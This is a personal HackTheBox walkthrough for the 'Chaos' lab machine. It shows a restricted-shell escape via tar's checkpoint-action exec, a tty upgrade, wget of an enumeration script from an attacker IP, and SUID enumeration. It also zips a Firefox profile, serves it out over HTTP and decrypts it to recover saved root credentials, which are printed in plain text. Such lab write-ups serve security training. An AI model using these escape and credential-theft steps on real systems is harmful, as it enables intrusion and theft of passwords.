<p>export -p to view the shell resitrictions this shows all the read only. declare -rx PATH=&ldquo;/home/ayush/.app&rdquo; declare -rx SHELL=&ldquo;/opt/rbash&rdquo;</p>

<pre><code>export -p
declare -x APACHE_LOCK_DIR=&quot;/var/lock/apache2&quot;
declare -x APACHE_LOG_DIR=&quot;/var/log/apache2&quot;
declare -x APACHE_PID_FILE=&quot;/var/run/apache2/apache2.pid&quot;
declare -x APACHE_RUN_DIR=&quot;/var/run/apache2&quot;
declare -x APACHE_RUN_GROUP=&quot;www-data&quot;
declare -x APACHE_RUN_USER=&quot;www-data&quot;
declare -x HOME=&quot;/home/ayush&quot;
declare -x INVOCATION_ID=&quot;df9e05d0804e4d1da0747f6120c01317&quot;
declare -x JOURNAL_STREAM=&quot;9:19877&quot;
declare -x LANG=&quot;en_US.UTF-8&quot;
declare -x LOGNAME=&quot;ayush&quot;
declare -x MAIL=&quot;/var/mail/ayush&quot;
declare -x OLDPWD=&quot;/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile&quot;
declare -rx PATH=&quot;/home/ayush/.app&quot;
declare -x PWD=&quot;/home&quot;
declare -x SELFAUTODIR=&quot;/usr&quot;
declare -x SELFAUTOGRANDPARENT=&quot;/&quot;
declare -x SELFAUTOLOC=&quot;/usr/bin&quot;
declare -x SELFAUTOPARENT=&quot;/&quot;
declare -rx SHELL=&quot;/opt/rbash&quot;
declare -x SHLVL=&quot;2&quot;
declare -x USER=&quot;ayush&quot;
declare -x XDG_RUNTIME_DIR=&quot;/run/user/1001&quot;
declare -x XDG_SESSION_ID=&quot;c4&quot;
declare -x engine=&quot;pdftex&quot;
declare -x progname=&quot;pdflatex&quot;

</code></pre>

<pre><code>export SHELL=&quot;/bin/bash&quot;
export SHELL=&quot;/bin/bash&quot;
rbash: SHELL: readonly variable
export USER=&quot;WWW-DATA&quot; =fail

echo $PATH returns /home/ayush/.app

echo os.system(&quot;/bin/bash&quot;)
echo os.system&quot;/bin/bash&quot;

python -c &quot;import os; os.system('cp');&quot;

cannot redirect output
cd is restricted
can't use /
tar xf /dev/null -I '/bin/sh -c &quot;sh &lt;&amp;2 1&gt;&amp;2&quot;'
access to tar

tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/ls
/bin/cat


</code></pre>

<p>ESCAPE FROM AYUSH JAIL</p>

<p>Escaping from this jail was pretty tough because none of the basic techiquies worked for me.
Able to use the tar wild card method to generate a shell. i believe this is a easter egg to tartarsauce.</p>

<pre><code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
</code></pre>

<p>BEYOND THE ESCAPE</p>

<p>upgrading tty to something easier to use,</p>

<pre><code>/usr/bin/python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>

<p>next step transfer off mail</p>

<pre><code>/usr/bin/python -m SimpleHTTPServer 9030
/usr/bin/wget http://10.10.14.14:9030/LinEnum.sh  
</code></pre>

<pre><code>inside mail directory i felt
/bin/ls -la
/bin/ls -la
total 20
drwx------ 3 ayush ayush 4096 Oct 28 12:17 .
drwx------ 6 ayush ayush 4096 Feb 11 03:37 ..
-rw------- 1 ayush ayush 2638 Oct 28 12:16 Drafts
drwx------ 5 ayush ayush 4096 Oct 28 12:13 .imap
-rw------- 1 ayush ayush    0 Oct 28 12:10 Sent
-rw------- 1 ayush ayush   17 Oct 28 12:13 .subscriptions
</code></pre>

<pre><code>/bin/ls -la
total 32
drwx------ 5 ayush ayush 4096 Oct 28 12:13 .
drwx------ 3 ayush ayush 4096 Oct 28 12:17 ..
-rw------- 1 ayush ayush 4028 Oct 28 12:16 dovecot.list.index.log
-rw------- 1 ayush ayush   48 Oct 28 12:13 dovecot.mailbox.log
-rw------- 1 ayush ayush    8 Oct 28 12:13 dovecot-uidvalidity
-r--r--r-- 1 ayush ayush    0 Oct 28 12:10 dovecot-uidvalidity.5bd5a723
drwx------ 2 ayush ayush 4096 Oct 28 12:13 Drafts
drwx------ 2 ayush ayush 4096 Oct 28 12:10 INBOX
drwx------ 2 ayush ayush 4096 Oct 28 12:10 Sent
</code></pre>

<p>Find Suin perms</p>

<pre><code>/usr/bin/find / -user root -perm -4000 -print 2&gt;/dev/null

/ -user root -perm -4000 -print 2&gt;/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/bin/ntfs-3g
/bin/su
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
</code></pre>

<pre><code>/usr/bin/sudo -l
[sudo] password for ayush: jiujitsu

Sorry, user ayush may not run sudo on chaos.
</code></pre>

<p>not sure why i didn&rsquo;t check the default directory fully first.</p>

<pre><code>/bin/ls -la
total 40
drwx------ 6 ayush ayush 4096 Feb 11 21:46 .
drwxr-xr-x 4 root  root  4096 Oct 28 11:34 ..
drwxr-xr-x 2 root  root  4096 Oct 28 12:25 .app
-rw------- 1 root  root     0 Nov 24 23:57 .bash_history
-rw-r--r-- 1 ayush ayush  220 Oct 28 11:34 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28 12:27 .bashrc
drwx------ 3 ayush ayush 4096 Feb 11 03:37 .gnupg
drwx------ 3 ayush ayush 4096 Oct 28 12:17 mail
drwx------ 4 ayush ayush 4096 Sep 29 12:09 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28 11:34 .profile
-rw------- 1 ayush ayush   33 Oct 28 12:54 user.txt
</code></pre>

<p>.APP</p>

<pre><code>lrwxrwxrwx 1 root  root     8 Oct 28 12:25 dir -&gt; /bin/dir
		/bin/dir -a
			.  ..  ayush  sahay

lrwxrwxrwx 1 root  root     9 Oct 28 12:25 ping -&gt; /bin/ping
lrwxrwxrwx 1 root  root     8 Oct 28 12:25 tar -&gt; /bin/tar
</code></pre>

<p>FIREFOX</p>

<pre><code>drwx------ 2 ayush ayush 4096 Sep 29 12:09 extensions
drwx------ 4 ayush ayush 4096 Sep 29 12:09 firefox
</code></pre>

<pre><code>drwx------ 10 ayush ayush   4096 Feb 12 02:25  bzo7sjt1.default
drwx------  4 ayush ayush   4096 Oct 15 03:59 'Crash Reports'
-rw-r--r--  1 ayush ayush    104 Sep 29 12:09  profiles.ini
-rw-rw-r--  1 ayush ayush 716752 Feb 12 03:16  user.zip
</code></pre>

<p>Root</p>

<p>I used zip to compress the mozilla profile and used a github decryptor to get the login creds. transfering bzo7sjt1.default to my system was tricky and compressing it.by default i went to tar but i was getting some kind of error where tar was truncating itsself. there are ways to force / bypass. Zip came to the rescue.</p>

<p><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></p>

<pre><code>/usr/bin/zip user.zip bzo7sjt1.default/* 
/usr/bin/python -m SimpleHTTPServer 9017
</code></pre>

<pre><code>python firefox_decrypt/firefox_decrypt.py bzo7sjt1.default/
2019-02-11 22:28:36,944 - WARNING - profile.ini not found in bzo7sjt1.default/ 
2019-02-11 22:28:36,944 - WARNING - Continuing and assuming 'bzo7sjt1.default/'
is a profile location

Master Password for profile bzo7sjt1.default/:

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'

</code></pre>

<p>So log back in and su root and enter the password.</p>


    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/hackthebox/boxes/blue/" title="Blue"> <i class="fa fa-chevron-left"></i><label>Blue</label></a>
    <a class="nav nav-next" href="/hackthebox/boxes/inusectf/" title="CTF" style="margin-right: 0px;"><label>CTF</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/CHAOS-OG.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>